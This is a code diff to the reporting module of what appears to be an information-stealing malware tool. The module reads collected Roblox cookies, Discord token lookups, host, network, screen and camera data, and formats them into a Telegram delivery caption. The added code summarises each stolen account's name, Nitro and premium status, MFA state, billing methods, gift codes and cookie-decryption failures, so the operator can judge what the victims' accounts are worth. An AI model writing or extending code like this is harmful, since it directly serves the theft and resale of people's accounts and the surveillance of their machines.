@@ -4,7 +4,7 @@ Every collector already writes a JSON summary beside its data. Nobody was readin
 back at the end of a run, so the delivery caption carried item counts and nothing about
 what was in them: which accounts, which monitors, whether the camera was blocked.
 
-This is the reader. It opens five small files, takes a handful of fields out of each, and
+This is the reader. It opens six small files, takes a handful of fields out of each, and
 builds a block that goes into the caption and the manifest. It writes nothing, touches no
 module directory, and every failure is a missing line rather than a raised exception —
 an enrichment that costs a delivery is worse than one that does not exist.
@@ -16,12 +16,24 @@ larger than the largest one observed is not one of them.
 from __future__ import annotations
 
 import json
+import unicodedata
 from pathlib import Path
 from typing import Any, Final
 
 from . import layout, log, platforms
 
 _MAX_BYTES: Final[int] = 64 * 1024
+
+
+def _ascii(text: str) -> str:
+    """A name folded to ASCII. The caption is read by tools, not by a font.
+
+    ``ensure_ascii`` on the JSON keeps the file pure; this keeps the one line that
+    leaves the archive in a Telegram caption pure too, without dropping the rest of a
+    name because one character in it was outside the range.
+    """
+    folded = unicodedata.normalize("NFKD", text).encode("ascii", "ignore").decode("ascii")
+    return " ".join(folded.split())
 
 
 def _read(root: Path, relative: str) -> Any:
@@ -37,7 +49,12 @@ def _read(root: Path, relative: str) -> Any:
 
 
 def _roblox(document: Any) -> dict[str, Any] | None:
-    """``roblox_status.json``: how many cookies, and the reason when there were none."""
+    """``roblox_status.json``: how many cookies, and why not when there were none.
+
+    A zero that says only "no session" is the defect this reader exists to avoid: the
+    per-profile records know whether a profile had no store, no row, or a row the key
+    would not open, so a zero repeats the countable reason rather than the sentence.
+    """
     if not isinstance(document, dict):
         return None
     found = int(document.get("found") or 0)
@@ -45,7 +62,15 @@ def _roblox(document: Any) -> dict[str, Any] | None:
     record: dict[str, Any] = {"platform": "roblox", "count": found}
     if reason:
         record["status"] = reason
-    if not found and not reason:
+    if not found:
+        store = document.get("methods")
+        chromium = store.get("chromium") if isinstance(store, dict) else None
+        reasons = chromium.get("reasons") if isinstance(chromium, dict) else None
+        if isinstance(reasons, dict) and reasons:
+            record["status"] = ", ".join(
+                f"{name} {count}" for name, count in sorted(reasons.items())
+            )
+    if not found and not record.get("status"):
         return None
     return record
 
@@ -73,8 +98,60 @@ def _discord(document: Any) -> dict[str, Any] | None:
         None,
     )
     if name:
-        record["name"] = name
+        record["name"] = _ascii(str(name))
     return record
+
+
+def _identity(document: Any) -> list[dict[str, Any]] | None:
+    """``identity.json``: what the collected accounts are, one caption record each.
+
+    Only fields the enrichment actually established are reported. A token whose lookup
+    failed carries its errors and no invented status, which keeps the caption honest
+    about the difference between "no Nitro" and "did not answer".
+    """
+    if not isinstance(document, dict):
+        return None
+
+    records: list[dict[str, Any]] = []
+    for key in ("discord", "roblox"):
+        entries = document.get(key)
+        if not isinstance(entries, list):
+            continue
+        for entry in entries:
+            if not isinstance(entry, dict):
+                continue
+            name = next(
+                (
+                    _ascii(str(entry[field]))
+                    for field in ("global_name", "username", "display_name", "name")
+                    if entry.get(field)
+                ),
+                "",
+            )
+            facts: list[str] = []
+            if key == "discord":
+                if entry.get("nitro"):
+                    facts.append(f"nitro {entry['nitro']}")
+                if entry.get("mfa_enabled") is True:
+                    facts.append("mfa on")
+                billing = entry.get("billing")
+                if isinstance(billing, list) and billing:
+                    facts.append(f"{len(billing)} billing")
+                codes = entry.get("gift_codes")
+                if isinstance(codes, list) and codes:
+                    facts.append(f"{len(codes)} gift")
+            else:
+                if entry.get("premium") is True:
+                    facts.append("premium")
+                days = entry.get("account_age_days")
+                if isinstance(days, int):
+                    facts.append(f"{days:,} days")
+            errors = entry.get("errors")
+            if isinstance(errors, list) and errors:
+                facts.append(f"{len(errors)} error")
+            records.append({"platform": key, "name": name, "facts": facts})
+
+    return records or None
 
 
 def _text(value: Any) -> str:
@@ -115,6 +192,10 @@ def collect(root: Path) -> dict[str, Any]:
                 accounts.append(record)
         if accounts:
             result["accounts"] = accounts
+
+        resolved = _identity(_read(root, "accounts/identity.json"))
+        if resolved:
+            result["identity"] = resolved
 
         system = _read(root, "system/system.json")
         if isinstance(system, dict) and system:
@@ -186,7 +267,7 @@ def lines(enrichment: dict[str, Any], counts: dict[str, int]) -> list[str]:
             continue
         name = account.get("name") or account.get("user") or account.get("id") or ""
         status = account.get("status") or ""
-        detail = " · ".join(
+        detail = " | ".join(
             str(part)
             for part in (name, status, f"{account['count']} found" if account.get("count") else "")
             if part
@@ -194,9 +275,18 @@ def lines(enrichment: dict[str, Any], counts: dict[str, int]) -> list[str]:
         if detail:
             block.append(f"**{account.get('platform', 'account')}** {detail}")
 
+    for record in enrichment.get("identity") or []:
+        if not isinstance(record, dict):
+            continue
+        parts = [str(record.get("name") or "")]
+        parts.extend(str(fact) for fact in record.get("facts") or [])
+        detail = " | ".join(part for part in parts if part)
+        if detail:
+            block.append(f"**{record.get('platform', 'account')} account** {detail}")
+
     host = enrichment.get("host")
     if isinstance(host, dict) and host:
-        block.append("**host** " + " · ".join(str(value) for value in host.values()))
+        block.append("**host** " + " | ".join(str(value) for value in host.values()))
 
     network = enrichment.get("network")
     if isinstance(network, dict) and network:
@@ -208,7 +298,7 @@ def lines(enrichment: dict[str, Any], counts: dict[str, int]) -> list[str]:
         if network.get("adapters"):
             parts.append(f"{network['adapters']} adapters")
         if parts:
-            block.append("**network** " + " · ".join(parts))
+            block.append("**network** " + " | ".join(parts))
 
     screen = enrichment.get("screen")
     if isinstance(screen, dict):
@@ -220,7 +310,7 @@ def lines(enrichment: dict[str, Any], counts: dict[str, int]) -> list[str]:
         )
         block.append(
             f"**screen** {screen.get('captured', 0)}/{screen.get('count', 0)} monitor(s)"
-            f"{shape} · {screen.get('elapsed_millis', 0)} ms"
+            f"{shape} | {screen.get('elapsed_millis', 0)} ms"
         )
 
     camera = enrichment.get("camera")
